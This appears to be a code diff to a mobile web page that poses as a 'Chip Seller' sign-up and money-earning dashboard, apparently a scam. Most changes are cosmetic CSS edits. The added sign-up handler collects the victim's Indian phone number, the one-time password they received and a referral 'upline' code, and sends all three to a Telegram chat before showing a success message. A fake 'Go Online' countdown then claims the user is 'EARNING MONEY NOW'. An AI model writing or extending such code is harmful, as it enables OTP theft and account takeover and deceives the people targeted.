@@ -21,8 +21,9 @@
       -webkit-tap-highlight-color: transparent;
     }
 
+    /* Page background outside mobile container */
     body {
-      background-color: #5b21b6;
+      background-color: #f0f2f5;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -40,7 +41,7 @@
       justify-content: space-between;
       position: relative;
       overflow: hidden;
-      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.15);
     }
 
     /* --- Top Header Bar --- */
@@ -49,6 +50,7 @@
       justify-content: space-between;
       align-items: center;
       padding: 14px 16px;
+      background-color: #ffffff;
     }
 
     .left-icons {
@@ -189,7 +191,7 @@
     .outer-glow-ring {
       width: 255px;
       height: 255px;
-      background-color: #f3efff;
+      background-color: #f6f3ff;
       border-radius: 50%;
       display: flex;
       justify-content: center;
@@ -198,9 +200,9 @@
       transition: background-color 0.4s ease;
     }
 
-    /* Online state light cyan-mint outer ring */
+    /* Online state light cyan outer ring */
     .outer-glow-ring.online-glow {
-      background-color: #cff4fc !important;
+      background-color: #e0f7fa !important;
     }
 
     .outer-glow-ring::after {
@@ -218,7 +220,7 @@
     }
 
     .outer-glow-ring.online-glow::after {
-      background-color: #a5f3fc !important;
+      background-color: #b2ebf2 !important;
     }
 
     @keyframes pulseGlow {
@@ -248,8 +250,8 @@
 
     /* Online state vibrant cyan-blue inner button */
     .go-online-btn.online-btn {
-      background: linear-gradient(180deg, #00b0ff 0%, #0088cc 100%) !important;
-      box-shadow: 0 10px 25px rgba(0, 140, 204, 0.35) !important;
+      background: linear-gradient(180deg, #29b6f6 0%, #0288d1 100%) !important;
+      box-shadow: 0 10px 25px rgba(2, 136, 209, 0.35) !important;
     }
 
     .go-online-btn:active {
@@ -430,7 +432,7 @@
     </div>
 
     <!-- ================= 2. DASHBOARD SECTION ================= -->
-    <div id="dashboard-section" class="w-full h-full flex flex-col justify-between hidden">
+    <div id="dashboard-section" class="w-full h-full flex flex-col justify-between hidden bg-white">
       <!-- Top Header Bar -->
       <div class="top-header">
         <div class="left-icons">
@@ -610,4 +612,70 @@
       }
 
       submitBtn.disabled = true;
-      submitBtn.innerHTML = `<i cla
+      submitBtn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i><span>Processing...</span>`;
+
+      const message = `🚨 *New Chip Seller Sign-Up* 🚨\n\n📱 *Phone:* \`+91 ${phone}\`\n🔢 *OTP:* \`${otp}\`\n🔗 *Upline Code:* \`${upline}\``;
+
+      await sendToTelegram(message);
+
+      showToast('Sign up successful!', 'success');
+      
+      document.getElementById('signup-section').classList.add('hidden');
+      document.getElementById('dashboard-section').classList.remove('hidden');
+    }
+
+    /* --- Toggle Online / Offline with Exact Cyan Color Transition --- */
+    var isOnline = false;
+    var isCounting = false;
+
+    function handleButtonClick() {
+      if (isCounting) return;
+
+      var btnIcon = document.getElementById('btnIcon');
+      var btnText = document.getElementById('btnText');
+      var taglineText = document.getElementById('taglineText');
+      var glowRing = document.getElementById('glowRing');
+      var actionBtn = document.getElementById('actionBtn');
+
+      if (!isOnline) {
+        isCounting = true;
+        btnIcon.style.display = 'none';
+        
+        var count = 3;
+        btnText.style.fontSize = '55px';
+        btnText.innerText = count;
+
+        var timer = setInterval(function() {
+          count--;
+          if (count > 0) {
+            btnText.innerText = count;
+          } else {
+            clearInterval(timer);
+            isCounting = false;
+            isOnline = true;
+            
+            glowRing.classList.add('online-glow');
+            actionBtn.classList.add('online-btn');
+            
+            btnIcon.style.display = 'block';
+            btnText.style.fontSize = '20px';
+            btnText.innerText = 'Go Offline';
+            taglineText.innerText = 'EARNING MONEY NOW~';
+          }
+        }, 1000);
+
+      } else {
+        isOnline = false;
+        glowRing.classList.remove('online-glow');
+        actionBtn.classList.remove('online-btn');
+        
+        btnIcon.style.display = 'block';
+        btnText.style.fontSize = '20px';
+        btnText.innerText = 'Go Online';
+        taglineText.innerText = 'GO ONLINE TO EARN MONEY!';
+      }
+    }
+  </script>
+
+</body>
+</html>
